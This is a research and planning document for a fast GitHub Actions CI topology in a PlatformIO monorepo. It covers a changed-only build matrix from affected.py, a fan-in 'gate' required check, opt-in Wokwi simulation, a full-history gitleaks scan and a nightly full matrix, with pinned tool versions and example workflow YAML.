# Phase 8: Fast CI - Research

**Researched:** 2026-10-26
**Domain:** GitHub Actions CI topology for a multi-project PlatformIO monorepo (changed-only
matrix, fan-in required check, opt-in Wokwi simulation, nightly full matrix)
**Confidence:** HIGH for in-repo contracts and command behaviour (every command below was read
in the source of truth and, where cheap, executed in this working tree); MEDIUM for GitHub
platform semantics (taken from official documentation, not exercised in this repository);
LOW for anything that only a live pull-request run can prove (timings, cache warm-up, the
ruleset picker).

<user_constraints>
## User Constraints (from CONTEXT.md)

### Locked Decisions

#### Workflow topology and the single gate

- **D-1:** One PR-time `ci.yml` owns `meta`, `changes`, `build`, `simulate`, and `gate`.
  `homework.yml` and `generated-views.yml` retire; their commands move into `meta`.
  `docs.yml` stays `main`-only because Pages deployment needs the `github-pages`
  environment and OIDC, which a PR cannot provide. `security.yml` retires because its
  full-history gitleaks scan moves into `meta`.
  — **Reversibility:** costly — the ruleset's required check name, `AGENTS.md`, the
  workflow text tests, and every open PR's status surface reference this topology.
- **D-2:** `gate` is a fan-in job with `needs:` naming **every** PR job and
  `if: ${{ !cancelled() }}`. It fails when any dependency reports `failure`, `cancelled`,
  or `timed_out`; only `gate` is required in the ruleset. `always()` is not used because it
  also runs after cancellation. `gate` is a stable public contract:
  `scripts/tests/test_ci_workflows.py` asserts the literal job id, and a rename must update
  the ruleset in the same pull request.
  — **Reversibility:** one-way — GitHub matches required checks by literal name, and a
  renamed job leaves the required check permanently `Pending`, blocking every merge until
  the ruleset is edited by hand.

#### Changed-only plumbing

- **D-3:** `changes` checks out with `fetch-depth: 0` and runs
  `uv run scripts/affected.py --base origin/<base_ref>`. On `workflow_dispatch` it falls
  back to `origin/main`. No third-party path filter is introduced: `affected.py` already
  owns the tested fanout and fail-safe, and a second glob dialect would disagree with it.
  — **Reversibility:** costly — the diff base is the input to every build decision, and a
  change alters what CI proves on every pull request.
- **D-4:** An empty matrix is skipped with a job-level
  `if: toJson(fromJson(needs.changes.outputs.matrix)) != '[]'`. The job-level condition is
  evaluated before the matrix is materialised, so it avoids GitHub's
  "Matrix vector does not contain any values" failure. `gate` treats an intentional skip as
  success, but fails when `changes` or `meta` failed. No synthetic noop entry is added to
  the `affected.py` output and no separate noop job exists.
- **D-5:** The fail-safe widening from 05/D-24 is preserved: an unrecognised shared path
  builds every project. It is never narrowed for speed; a slow correct run beats a fast
  unproven one.

#### Build and test execution

- **D-6:** Per matrix entry, `env == "native"` runs
  `pio test -d <project> -e native`; every other environment runs
  `pio run -d <project> -e <env>`. Both `platformio.ini` files already document this
  contract ("reached with `pio test -e native`, never with `pio run -e native`"), and the
  top-level `tests/` project needs no special case. The 05/D-22 output contract is not
  changed.
  — **Reversibility:** costly — the command rule is the definition of what a green build
  means for every matrix entry.
- **D-7:** The build matrix uses `fail-fast: false` and `max-parallel: 4`. One project's
  failure does not cancel the others, and a `lib/**` fanout cannot occupy every runner.
  — **Reversibility:** reversible — both knobs are local to `ci.yml`.

#### Simulation policy

- **D-8:** Simulation runs only when a maintainer applies the `simulate` label to the pull
  request **and** `affected.py` returns a non-empty `simulate` array. Fork PRs cannot apply
  the label, and the roadmap describes simulation as optional.
  — **Reversibility:** reversible — a later decision can auto-run for changed projects.
- **D-9:** Belt-and-braces fork guard: the job-level `if` requires the head repository to
  equal the base repository (`github.event.pull_request.head.repo.full_name ==
  github.repository`) and the label; the token is checked at step level, because a
  job-level `if` that references `secrets.*` can break YAML evaluation. A skipped simulation
  is success for `gate`; simulation is never a required check for fork pull requests.
- **D-10:** The simulation job uploads `serial.log`, the full scenario stdout, and a
  duration/quota JSON, with 7-day retention. The evidence must allow reproducing the run and
  confirming quota without re-running it.
- **D-11:** `wokwi-cli lint` stays in `meta` for every pull request: it needs no token and
  consumes no simulation quota.
- **D-12:** Simulation never flips `simulation.status` to `verified` by itself; the metadata
  status remains governed by the Phase 7 evidence rule — only an executed, evidenced run
  with the `scenario passed` outcome justifies it.

#### Meta job surface

- **D-13:** The lint gate is one step,
  `pre-commit run --all-files --show-diff-on-failure`, with `pre-commit install-hooks` as a
  separate preceding step. `~/.cache/pre-commit` is cached on
  `hashFiles('.pre-commit-config.yaml')` with no `restore-keys`, so a pin bump rebuilds and
  a near-miss never runs linters outside the reviewed pin. clang-tidy's `pre-push` stage is
  not part of this command by construction.
- **D-14:** The full-history gitleaks scan moves from `security.yml` into `meta` as
  `gitleaks git --redact --verbose --log-opts="--all"`, keeping the pinned 8.30.1 binary and
  its checksum.
- **D-15:** `docs-build` (`mkdocs build --strict` plus the existing
  `scripts/ci/check_lfs_pointers.sh site` guard) and `python-tests`
  (`python -m unittest discover scripts/tests`) run as parallel jobs and feed the same
  `gate`. This closes WR-13 without slowing the lint feedback.
- **D-16:** The PR-title check is a `meta` step validating
  `^(feat|fix|test|refactor|perf|docs|style|chore)\([a-z0-9._-]+\): .+$` against
  `github.event.pull_request.title`; it is skipped on `workflow_dispatch`.
- **D-17:** clang-tidy in CI analyses host translation units only (`lib/common`, `lib/port`,
  `lib/host`) with a freshly generated compile database. Native test translation units stay
  the recorded ADR-0013 gap; closing it needs the `unity_config.h` fix and is not part of
  this phase.

#### Caching and timeouts

- **D-18:** Build jobs cache `~/.platformio/packages`, `~/.platformio/.cache`, and
  `~/.cache/pip`, keyed on `runner.os` plus `hashFiles('platformio.shared.ini',
  'platformio.ini')`, with no broad `restore-keys`. The pins live in
  `platformio.shared.ini`, so hashing only a project's `platformio.ini` would not invalidate
  the toolchain on an espressif32 bump.
  — **Reversibility:** reversible — the cache is a performance optimisation, not a contract.
- **D-19:** Initial timeouts are generous: `meta` 15, `docs-build` 15, `python-tests` 10,
  each `build` job 30, `simulate` 10, `gate` 5, `nightly` 90 minutes. Cold and warm
  durations are measured over the first runs and the timeouts are tightened in a follow-up
  commit (F-15), not guessed downward up front.

#### Human checkpoint and repository rules

- **D-20:** After the first green `ci.yml` run on a pull request, the repository owner adds
  `gate` as the required status check in the GitHub ruleset (0 approvals) through the UI.
  This is recorded as a human checkpoint in phase verification. A required check cannot be
  selected before it has passed at least once within the last 7 days, and rulesets remain a
  GitHub-UI artifact per `AGENTS.md`.
- **D-21:** `AGENTS.md` is updated: the quick-start gains the CI commands, the PR/tags
  section names the `gate` contract, and the quality-tooling section records that CI now
  runs the hook surface. The claim that `generated-views.yml` is a drift gate is replaced by
  the `meta` job.

### Claude's Discretion

- Every job id except `gate`, the step order inside `meta`, and the exact action SHAs
  (existing pinned SHAs are reused where the action is unchanged).
- The wording of `gate`'s failure diagnostic and how it prints `toJSON(needs.*.result)`.
- The exact shape of the duration/quota JSON artifact.
- The cron minute inside the ~03:00 UTC window for `nightly.yml`.
- Whether `docs-build` invokes `check_lfs_pointers.sh` exactly as `docs.yml` does or through
  a shared step.

### Deferred Ideas (OUT OF SCOPE)

- **clang-tidy over native test translation units** — remains the ADR-0013 gap; needs the
  `unity_config.h` fix and is not part of Fast CI.
- **Merge queue support (`merge_group`)** — no merge queue is enabled; revisit only if one
  is adopted, because a missing trigger leaves the required check pending.
- **Nightly failure notifications** — not built; the job log and the red run are the signal.
- **Weekly full simulation matrix** — out of scope; the free-tier quota cannot sustain it.
- **Programmatic ruleset changes via the GitHub API** — declined; `AGENTS.md` keeps rulesets
  in the UI, so the required check is a human checkpoint.
- **A reusable workflow to share the build job between `ci.yml` and `nightly.yml`** —
  considered and declined in favour of two explicit files.
- **ESP-IDF compile-database completeness fallback** — belongs to the first ESP-IDF
  homework, not this phase.

### Reviewed Todos (not folded)

- *Expand homework README and add a proper SVG schematic* — homework content and reader
  documentation; Phase 11.
- *Promote `merge_firmware.py` into a shared tool* — already executed in Phase 7.
- *Generate a root compile database so `lib/` has working IntelliSense* — resolved by
  Phase 06.1.
- *Trim governance ceremony (Phase 4.1)* — already completed.
</user_constraints>

<phase_requirements>
## Phase Requirements

| ID | Description | Research Support |
|----|-------------|------------------|
| TOOL-05 | CI has a fast `meta` job (schema, `--check` drift, lint, gitleaks, architecture check) and a `changes` job that computes the affected matrix. | `pre-commit run --all-files` was executed here and runs all 13 hooks including `check-metadata`, `gen-views-check` and `check-architecture`; the gitleaks hook in that mode scans nothing (it is `--staged`), so the D-14 full-history step is mandatory; `changes` reads the verified `{build, simulate}` JSON contract. |
| TOOL-06 | CI builds and tests changed projects on every pull request and exposes a single required `gate` check; nightly runs the full build and unit-test matrix. | Matrix construction from `affected.py` JSON, `pio run` vs `pio test -e native` split, fan-in `gate` with allowlisted `needs` results, the literal check-name trap, and a verified widen-all invocation for the nightly matrix. |
| SIM-04 | Simulation in CI is introduced only after the spike, only for changed projects, with explicit timeouts and artifact upload, and is never a required check for fork pull requests. | Fork-secret behaviour, the same-repo + label guard, the pinned `wokwi-cli` 0.28.1 direct invocation (the official action downloads `latest` and cannot tee stdout), the measured 15 s upper bound, and the artifact set. |

## Project Constraints (from CLAUDE.md / AGENTS.md)

`AGENTS.md` is the canonical rulebook; `.claude/CLAUDE.md` is a mechanics adapter and wins on
nothing. Directives that constrain this phase:

- Every change arrives through a branch and a pull request; squash-merge only; never
  force-push or rewrite published history. GitHub rulesets are maintained in the UI.
- Commit subjects follow Conventional Commits `type(scope): summary` with `type` one of
  `feat`, `fix`, `test`, `refactor`, `perf`, `docs`, `style`, `chore`.
- gitleaks must pass: staged changes locally and the **full history** in CI. A red scan
  blocks the change.
- Every formatter and linter arrives through a pinned `pre-commit` revision; hooks are
  check-only and never rewrite. clang-tidy runs only at pre-push, on host translation units.
- Generated views are never hand-edited; `uv run scripts/gen_views.py --all` is the only fix
  and `--check` is the gate.
- Generated files (`compile_commands.json`, `site/`, `.pio/`) are never committed; the
  `no-generated-files` hook fails when one is tracked anyway.
- Git LFS is limited to the eight declared extensions; nothing else may exceed 1024 kB.
- Repository artifacts are English; paths and identifiers are ASCII-only. No secret, PII, or
  internal course material may enter the history.
- `python3 scripts/check_architecture.py` enforces the shared-library dependency rule.
- Work through a GSD command; do not edit the repository outside one.

## Summary

The phase is an orchestration change, not a new toolchain: every command CI needs already
exists and is already pinned locally. `scripts/affected.py` emits the exact
`{"build": [...], "simulate": [...]}` payload CI must feed to `fromJson(...)`, and stdout
carries only that payload, so the `changes` job is a thin wrapper. The fast `meta` job can be
one `pre-commit run --all-files --show-diff-on-failure` step because the hook surface already
contains the metadata schema, the generated-view drift check and the architecture rule — but
the gitleaks hook in that mode scans only staged changes, which are empty on a fresh
checkout, so the full-history scan must remain its own step. `wokwi-cli lint` is a separate
cheap step, and `clang-tidy` cannot live in `meta` because it needs a PlatformIO native
compile database.

The single most important platform fact is that GitHub matches a required check by the job's
**name**, and a job that is skipped by an `if` reports **Success**. That makes the fan-in
`gate` job the only stable required check, and it makes the job-level empty-matrix guard safe.
The most important correction to the context's wording is that `needs.<job>.result` has only
four values — `success`, `failure`, `cancelled`, `skipped` — so `gate` must use an allowlist
(`success`/`skipped`) rather than testing for `timed_out`.

The simulation job is where the phase carries real risk. The official
`wokwi/wokwi-ci-action` installs `wokwi-cli` from `releases/latest/...` (unpinned) and cannot
tee the scenario stdout to a file, which D-10 requires; invoke the pinned 0.28.1 binary from a
`run:` step instead, verifying a digest recorded in the repository. The job must build the
firmware itself (no build job uploads firmware), because `wokwi.toml` points at
`.pio/build/esp32s3_arduino/firmware.merged.bin`.

**Primary recommendation:** build `ci.yml` with `meta`, `changes`, `build`, `simulate`,
`docs-build`, `python-tests`, `static-analysis` and a literal `gate` whose only failure test
is `needs.*.result not in {success, skipped}`; derive both matrices from `affected.py` via
`jq -c`; and run `nightly.yml` as the same build matrix fed by the mapper's own widen-all rule
plus a full-history gitleaks scan.

## Architectural Responsibility Map

| Capability | Primary Tier | Secondary Tier | Rationale |
|------------|-------------|----------------|-----------|
| Diff → build/simulation matrix | CI orchestration (`changes` job) | `scripts/affected.py` (repository script) | The mapper owns the tested fanout and fail-safe; CI only pipes and publishes its JSON. |
| Policy, schema, drift, lint, architecture | CI `meta` job | `.pre-commit-config.yaml` (pinned hook surface) | One hook command is the single source of truth; duplicating hook invocations in YAML would create a second contract. |
| Full-history secret scan | CI `meta` job | gitleaks binary (pinned 8.30.1) | The pre-commit hook is staged-only; a separate step is the only way to scan history. |
| Build / native test per project | CI `build` matrix | PlatformIO Core 6.2.0 | The matrix entry names the project and environment; PlatformIO owns the build. |
| Simulation execution | CI `simulate` matrix (opt-in) | Wokwi CLI 0.28.1 + repository secret | Simulation is metered and token-gated, so it must not sit in an always-on job. |
| Required merge decision | `gate` job + GitHub ruleset | — | The ruleset can require exactly one literal check name; the aggregator makes that name stable. |
| Nightly full verification | `nightly.yml` | `affected.py` widen-all | A schedule, not a diff, drives the full matrix; no simulation. |
| Site build and LFS guard | CI `docs-build` job | MkDocs pins + `scripts/ci/check_lfs_pointers.sh` | PRs cannot deploy, but they can build; deployment stays in `docs.yml`. |
| Host static analysis | CI `static-analysis` job | `scripts/clang-tidy-db` + pre-push hooks | Needs a PlatformIO native build, so it must not slow the fast feedback job. |

## Standard Stack

### Core

| Tool / Action | Version | Purpose | Why standard |
|---------------|---------|---------|--------------|
| GitHub Actions runner | `ubuntu-24.04` | Every job | Already used by all four workflows; pinning the image avoids the `ubuntu-latest` move to 26.04 announced for November 2026. `[VERIFIED: actions/runner-images Ubuntu2404-Readme.md, Image Version 20261023.334.3]` |
| `actions/checkout` | `v7.0.1` — `3d3c42e5aac5ba805825da76410c181273ba90b1` | Checkout | Existing pin, reused verbatim. `[VERIFIED: .github/workflows/docs.yml:42]` |
| `actions/setup-python` | `v7.1.0` — `6d4fd22b20465ccc0f7354476588e8df7c9ca0e0` | Python 3.13 | Existing pin; the runner's default is 3.12.3. `[VERIFIED: .github/workflows/docs.yml:46-48]` |
| `actions/cache` | `v6.1.0` — `55cc8345863c7cc4c66a329aec7e433d2d1c52a9` | Toolchain and hook caches | Existing pin in `homework.yml`. `[VERIFIED: .github/workflows/homework.yml:25]` |
| `actions/upload-artifact` | `v7.0.2` — `cf430e030ddbb5b0abf93d22962f4752f3646cd9` | Simulation evidence | New in this phase; `v7` resolves to the same SHA. `[VERIFIED: git ls-remote actions/upload-artifact refs/tags/v7 refs/tags/v7.0.2]` |
| Python | `3.13` | Scripts, docs, tests | Matches every existing workflow and `pyproject.toml` `target-version = "py313"`. `[VERIFIED: pyproject.toml:13]` |
| PlatformIO Core | `6.2.0` | Build and native test | The repository's pinned toolchain. `[VERIFIED: .github/workflows/homework.yml:35]` |
| pre-commit | `4.7.0` | The whole lint gate | Exactly `minimum_pre_commit_version`. `[VERIFIED: .pre-commit-config.yaml:1]` |
| gitleaks | `8.30.1` | Full-history secret scan | Existing pin and checksum from `security.yml`. `[VERIFIED: .github/workflows/security.yml:24-27]` |
| wokwi-cli | `0.28.1` | Diagram lint and scenario execution | The version installed locally and named by the path test. `[VERIFIED: wokwi-cli --version → 0.28.1 (7cf4ffaebfd8)]` |
| `uv` | `0.13.5` | Run PEP 723 scripts | Required by `scripts/tests` and by `affected.py`; install it explicitly in every job. `[VERIFIED: PyPI uv 0.13.5 release exists]` `[ASSUMED: the Ubuntu 24.04 runner image ships no `uv` — its software list names none]` |
| `jq` | `1.7` | Compact JSON outputs | Preinstalled on `ubuntu-24.04`; converts the pretty-printed mapper payload to one-line step outputs. `[VERIFIED: Ubuntu2404-Readme.md line 84 "- jq 1.7"]` |

### Supporting

| Tool | Version | Purpose | When to use |
|------|---------|---------|-------------|
| `astral-sh/setup-uv` | `v10.3.2` — `07a047e608db84b3d8c06cd9a7c7dcc9c355c18e` | Install `uv` as an action | Only if the planner prefers an action over `python -m pip install uv==0.13.5`. `[VERIFIED: git ls-remote; GitHub API latest v10.3.2, 2026-10-22]` |
| `requirements-docs.txt` | `mkdocs 1.6.1`, `mkdocs-material 9.7.7`, `pymdown-extensions 12.3` | `docs-build` | Use exactly as `docs.yml` does; do not introduce `uv` here. `[VERIFIED: requirements-docs.txt:1-3]` |

### Alternatives Considered

| Instead of | Could use | Tradeoff |
|------------|-----------|----------|
| `affected.py` | `dorny/paths-filter` or `on.pull_request.paths` | Rejected by D-3: a second glob dialect would disagree with the tested fanout and fail-safe, and `paths:` skips the whole workflow, leaving a required check permanently pending. |
| Direct `wokwi-cli` invocation | `wokwi/wokwi-ci-action@v1.3.0` | The action installs `wokwi-cli` from `releases/latest/...` (unpinned) and has no way to tee stdout to a file, so it cannot satisfy D-10. |
| `python -m pip install uv` | `astral-sh/setup-uv` | A pip pin matches the existing "tool arrived through a pinned pip install" pattern and adds no third-party action SHA; the action gives caching and a managed path. |
| Two explicit workflows | One reusable workflow | Deferred by the context; two files keep `nightly` readable and avoid a `workflow_call` contract this phase does not need. |

**Installation (inside jobs):**

```bash
python -m pip install platformio==6.2.0
python -m pip install pre-commit==4.7.0
python -m pip install uv==0.13.5
python -m pip install -r requirements-docs.txt
```

### Verbatim source lines behind the `[VERIFIED]` tags

```text
[.pre-commit-config.yaml:1]        minimum_pre_commit_version: '4.7.0'
[.pre-commit-config.yaml:15]           - id: gitleaks          # entry: gitleaks git --pre-commit --redact --staged --verbose
[.pre-commit-config.yaml:198]            entry: python scripts/gen_views.py --all --check
[.pre-commit-config.yaml:239]            stages: [pre-push]
[.pre-commit-config.yaml:261]            stages: [pre-push]
[platformio.shared.ini:5]          platform = espressif32@8.0.0
[platformio.shared.ini:35]         platform = native
[pyproject.toml:13]                target-version = "py313"
[scripts/affected.py:50-51]         `{"build": [{"project", "env", "framework"}], "simulate": [...]}` sorted by
                                   `(project, env)`. `--format paths` prints `build <project> <env> <framework>`
[scripts/affected.py:113-119]      WIDEN_ALL = (
                                       "platformio.shared.ini",
                                       "partitions/",
                                       "scripts/pio/",
                                       "schema/",
                                       "scripts/affected.py",
                                   )
[scripts/affected.py:497]              return json.dumps(payload, indent=2) + "\n"
[scripts/tests/test_ci_workflows.py:90]      self.assertIn("python scripts/gen_views.py --all --check", text)
[scripts/tests/test_ci_workflows.py:119]     self.assertEqual(4, len(files), [path.name for path in files])
[.github/workflows/security.yml:24]            GITLEAKS_VERSION: 8.30.1
[.github/workflows/security.yml:27]            GITLEAKS_SHA256: 551f6fc83ea457d62a0d98237cbad105af8d557003051f41f3e7ca7b3f2470eb
[.github/workflows/security.yml:45]          run: gitleaks git --redact --verbose --log-opts="--all"
[.github/workflows/docs.yml:48]              python-version: '3.13'
[.github/workflows/docs.yml:56]          run: mkdocs build --strict
[.github/workflows/docs.yml:60]          run: bash scripts/ci/check_lfs_pointers.sh site
[homeworks/1_3-police-flasher/wokwi.toml:3]   firmware = ".pio/build/esp32s3_arduino/firmware.merged.bin"
[homeworks/1_3-police-flasher/wokwi.toml:4]   elf = ".pio/build/esp32s3_arduino/firmware.elf"
[scripts/clang-tidy-db:52]         DATABASE = Path("tests") / "compile_commands.json"
[scripts/clang-tidy-db:56]         CONFIG_INPUTS = (Path("tests") / "platformio.ini", Path("platformio.shared.ini"))
[scripts/clang-tidy-db:60]         ANALYSER_SOURCES = (Path("lib") / "common" / "src", Path("lib") / "host" / "src")
```

## Package Legitimacy Audit

No new repository dependency is added by this phase: the phase installs existing pinned tools
inside ephemeral CI jobs. The gate was still run for the three PyPI packages CI installs.

| Package | Registry | Age (latest release) | Downloads | Source repo | Verdict | Disposition |
|---------|----------|----------------------|-----------|-------------|---------|-------------|
| `platformio` | PyPI | 2026-09-05 | unknown (registry reports none) | platformio.org | SUS | Approved with an exact pin (`==6.2.0`); already the repository's pinned toolchain, not a new introduction. |
| `pre-commit` | PyPI | 2026-10-12 | unknown | github.com/pre-commit/pre-commit | SUS | Approved with an exact pin (`==4.7.0`); already the repository's gate runner. |
| `uv` | PyPI | 2026-10-22 | unknown | pypi.org/project/uv | SUS | Approved with an exact pin (`==0.13.5`); already required by `scripts/tests`. |
| `gitleaks` (binary) | GitHub release | pinned 8.30.1 | n/a | github.com/gitleaks/gitleaks | OK | Approved; checksum already committed. |
| `wokwi-cli` (binary) | GitHub release | pinned 0.28.1 | n/a | github.com/wokwi/wokwi-cli | — | The complete v0.28.1 asset list (six platform binaries plus `version.json`) names no checksum file, so record the observed SHA-256 in the repository (the KaTeX-ledger precedent). `[VERIFIED: GitHub API release v0.28.1]` |
| `actions/*` | GitHub Marketplace | pinned by SHA | n/a | github.com/actions/* | OK | Approved; SHAs verified with `git ls-remote`. |

**Packages removed due to [SLOP] verdict:** none.

**Packages flagged as suspicious [SUS]:** `platformio`, `pre-commit`, `uv` — all three are
flagged only because the seam cannot read PyPI download telemetry (`unknown-downloads`) and
the latest releases are recent (`too-new`). They are pre-existing, first-party to the
project's toolchain and already pinned in the repository. The planner should add one
consolidated `checkpoint:human-verify` before the first CI run that installs them, rather
than one per job.

**wokwi-cli digest observed on 2026-10-26:**

```text
869f194ee473257c6112ed58d786376527769020056320b0a49a37d9e7d3bdd7  wokwi-cli-linuxstatic-x64
```

This is a locally computed digest of the `v0.28.1` release asset, not a vendor-published
checksum. Commit it in a ledger file (or as a workflow constant) so the CI check is
reproducible, and label it as an observed value.

## Architecture Patterns

### System Architecture Diagram

```text
pull_request (opened / synchronize / reopened / edited)   workflow_dispatch
        │                                                        │
        ├──────────────┬──────────────┬─────────────┬────────────┴───────────────┐
        ▼              ▼              ▼             ▼                            ▼
      meta          changes        docs-build   python-tests               static-analysis
  pre-commit          │          mkdocs --strict  unittest      pio run -t compiledb
  --all-files         │          LFS guard        (380 tests)   pre-commit --hook-stage
  PR title            │                                              pre-push
  gitleaks --all      │
  wokwi-cli lint      │
        │             ├── build[]  ──► build matrix ──► pio run -d P -e E
        │             │                          └──► pio test -d P -e native
        │             └── simulate[] ─► simulate matrix (label + same-repo + token)
        │                                   ├─► pio run -d P -e E
        │                                   ├─► wokwi-cli P --timeout 15000
        │                                   └─► upload-artifact (serial/stdout/quota)
        └──────────────────────────────┬─────────┘
                                       ▼
                                     gate  (needs: all of the above, if: !cancelled())
                                       │  allowlist: success | skipped
                                       ▼
                            required status check "gate"
                                       ▲
                                       │ ruleset (human checkpoint, UI)
nightly (schedule 03:xx UTC) ─► changes --paths-from (widen all) ─► build matrix
                             └─► gitleaks --all (recommended, see Open Question 1)
```

### Recommended Project Structure

```text
.github/workflows/
├── ci.yml        # PR gate: meta, changes, build, simulate, docs-build, python-tests,
│                 # static-analysis, gate
├── nightly.yml   # schedule: widen-all matrix (build + native tests), no simulation
└── docs.yml      # unchanged, main-only Pages deploy
```

### Pattern 1: Fan-in gate with an allowlisted result set

**What:** One job depends on every PR job and fails unless each dependency ended `success`
or `skipped`.

**When to use:** Always for this repository, because the ruleset can require exactly one
literal check name and matrix job names are unstable.

```yaml
  gate:
    name: gate
    needs: [changes, meta, build, simulate, docs-build, python-tests, static-analysis]
    if: ${{ !cancelled() }}
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    steps:
      - name: Every required job succeeded
        env:
          RESULTS: ${{ toJSON(needs) }}
        run: |
          set -euo pipefail
          printf '%s\n' "$RESULTS"
          failed="$(printf '%s' "$RESULTS" | jq -r \
            'to_entries[] | select(.value.result != "success" and .value.result != "skipped") \
             | "\(.key)=\(.value.result)"')"
          if [ -n "$failed" ]; then
            echo "::error::required job did not succeed: ${failed//$'\n'/, }"
            exit 1
          fi
```

Source: the fan-in pattern and the "skipped job reports Success" rule
`[CITED: https://jakewharton.com/fan-in-to-a-single-required-github-action/]`; the `needs`
result vocabulary `[CITED: https://docs.github.com/en/actions/reference/workflows-and-actions/contexts]`.

### Pattern 2: Matrix from the mapper's JSON

**What:** The mapper prints a pretty-printed object; `jq -c` turns each array into a
single-line step output that `fromJson` can consume.

**When to use:** Both `build` and `simulate`, in `ci.yml` and `nightly.yml`.

```yaml
  changes:
    name: changes
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    outputs:
      build: ${{ steps.affected.outputs.build }}
      simulate: ${{ steps.affected.outputs.simulate }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
        with:
          persist-credentials: false
          fetch-depth: 0
      - uses: actions/setup-python@6d4fd22b20465ccc0f7354476588e8df7c9ca0e0  # v7.1.0
        with:
          python-version: '3.13'
      - name: Install uv
        run: python -m pip install uv==0.13.5
      - name: Compute the matrix
        id: affected
        env:
          BASE_REF: ${{ github.base_ref }}
        run: |
          set -euo pipefail
          base="${BASE_REF:-main}"
          payload="$(uv run scripts/affected.py --base "origin/$base")"
          printf 'build=%s\n' "$(printf '%s' "$payload" | jq -c .build)" >> "$GITHUB_OUTPUT"
          printf 'simulate=%s\n' "$(printf '%s' "$payload" | jq -c .simulate)" >> "$GITHUB_OUTPUT"
```

### Pattern 3: `meta` as one hook command plus two separate steps

**What:** `pre-commit run --all-files` covers schema, drift, lint and architecture; the
full-history secret scan and the diagram lint are their own steps because the hook command
does not provide them.

**When to use:** The `meta` job.

```yaml
  meta:
    name: meta
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1  # v7.0.1
        with:
          persist-credentials: false
          fetch-depth: 0          # required by the full-history scan
      - uses: actions/setup-python@6d4fd22b20465ccc0f7354476588e8df7c9ca0e0  # v7.1.0
        with:
          python-version: '3.13'
      - uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9  # v6.1.0
        with:
          path: ~/.cache/pre-commit
          key: ${{ runner.os }}-pre-commit-${{ hashFiles('.pre-commit-config.yaml') }}
      - name: Install the pinned gate tools
        run: python -m pip install pre-commit==4.7.0
      - name: Check the pull-request title
        if: github.event_name == 'pull_request'
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          set -euo pipefail
          pattern='^(feat|fix|test|refactor|perf|docs|style|chore)\([a-z0-9._-]+\): .+$'
          if [[ ! "$PR_TITLE" =~ $pattern ]]; then
            echo "::error::pull-request title must match ${pattern}"
            exit 1
          fi
      - name: Install pre-commit environments
        run: pre-commit install-hooks
      - name: Run the hook surface
        run: pre-commit run --all-files --show-diff-on-failure
      # then: gitleaks install + `gitleaks git --redact --verbose --log-opts="--all"`
      # then: wokwi-cli install + a loop over homeworks/*/assets/diagram.json
```

### Pattern 4: Opt-in simulation with a belt-and-braces guard

**What:** A job-level guard on the head repository and the label, a step-level token check,
a build before the run, and an unconditional artifact upload.

**When to use:** The `simulate` job only.

```yaml
  simulate:
    name: simulate / ${{ matrix.project }} / ${{ matrix.env }}
    needs: changes
    if: >-
      ${{ !cancelled()
      && github.event.pull_request.head.repo.full_name == github.repository
      && contains(github.event.pull_request.labels.*.name, 'simulate')
      && needs.changes.outputs.simulate != ''
      && needs.changes.outputs.simulate != '[]' }}
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    strategy:
      fail-fast: false
      max-parallel: 2
      matrix:
        include: ${{ fromJson(needs.changes.outputs.simulate) }}
    env:
      WOKWI_CLI_TOKEN: ${{ secrets.WOKWI_CLI_TOKEN }}
    steps:
      # checkout, setup-python, cache, pip install platformio==6.2.0
      - name: Refuse to run without a token
        if: env.WOKWI_CLI_TOKEN == ''
        run: |
          echo "::error::WOKWI_CLI_TOKEN is not configured; add the secret before labelling"
          exit 1
      - name: Build the simulated firmware
        env:
          PROJECT: ${{ matrix.project }}
          ENV_NAME: ${{ matrix.env }}
        run: pio run -d "$PROJECT" -e "$ENV_NAME"
      # install pinned wokwi-cli 0.28.1 with the recorded SHA-256
      - name: Run the scenario
        env:
          PROJECT: ${{ matrix.project }}
          ENV_NAME: ${{ matrix.env }}
        run: |
          set -euo pipefail
          out="$RUNNER_TEMP/simulation"
          mkdir -p "$out"
          started=$(date +%s)
          set +e
          wokwi-cli "$PROJECT" \
            --timeout 15000 \
            --scenario scenario.yaml \
            --diagram-file assets/diagram.json \
            --serial-log-file "$out/serial.log" \
            2>&1 | tee "$out/stdout.log"
          status=${PIPESTATUS[0]}
          set -e
          finished=$(date +%s)
          jq -n --arg project "$PROJECT" --arg env "$ENV_NAME" \
            --argjson wall "$((finished - started))" --argjson bound 15 \
            --arg outcome "$([ "$status" -eq 0 ] && echo passed || echo failed)" \
            '{project: $project, env: $env, wall_clock_seconds: $wall,
              simulated_seconds_upper_bound: $bound,
              quota_label: "calculated (upper bound)", runs: 1, outcome: $outcome}' \
            > "$out/quota.json"
          exit "$status"
      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9  # v7.0.2
        if: always()
        with:
          name: simulation-${{ matrix.project }}-${{ matrix.env }}
          path: ${{ runner.temp }}/simulation
          retention-days: 7
          if-no-files-found: warn
```

### Pattern 5: Nightly full matrix from the mapper's widen-all rule

**What:** Feed `affected.py` a synthetic changed path that its own `WIDEN_ALL` table maps to
every project, so the full matrix needs no new script and no new flag.

**When to use:** The `changes` job in `nightly.yml`.

```yaml
      - name: Compute the full matrix
        id: affected
        run: |
          set -euo pipefail
          printf 'platformio.shared.ini\n' > "$RUNNER_TEMP/all-paths.txt"
          payload="$(uv run scripts/affected.py --paths-from "$RUNNER_TEMP/all-paths.txt")"
          printf 'build=%s\n' "$(printf '%s' "$payload" | jq -c .build)" >> "$GITHUB_OUTPUT"
```

Verified locally against the current tree:

```text
$ printf 'platformio.shared.ini\n' > /tmp/gsd-widen-all.txt
$ uv run scripts/affected.py --paths-from /tmp/gsd-widen-all.txt
{
  "build": [
    {"project": "homeworks/1_3-police-flasher", "env": "esp32s3_arduino", "framework": "arduino"},
    {"project": "homeworks/1_3-police-flasher", "env": "native", "framework": "native"},
    {"project": "tests", "env": "native", "framework": "native"}
  ],
  "simulate": [
    {"project": "homeworks/1_3-police-flasher", "env": "esp32s3_arduino", "framework": "arduino"}
  ]
}
```

### Anti-Patterns to Avoid

- **`on.pull_request.paths:` filtering the whole workflow.** A required check that never
  reports stays `Pending` and blocks the merge; path selection belongs inside the job graph.
